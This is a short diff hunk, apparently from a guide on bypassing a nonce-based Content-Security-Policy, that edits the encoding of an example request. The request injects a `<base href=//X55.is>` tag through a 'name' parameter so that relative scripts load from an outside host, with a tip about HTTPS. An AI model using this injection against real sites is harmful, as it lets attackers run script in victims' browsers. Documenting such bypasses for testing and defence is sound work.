@@ -14,7 +14,7 @@ Content-Security-Policy: script-src 'nonce-abcd1234';
 
 An attacker can be used the following payload `<base href=//X55.is>` as follows:
 ```txt
-http://target-website.com/?name=guest<base%20href=//X55.is>
+http://target-website.com/?name=guest<base href=//X55.is>
 ```
 >Note: If the vulnerable page is loaded with HTTPS, make sure to use HTTPS URL in the `base` tag.
 
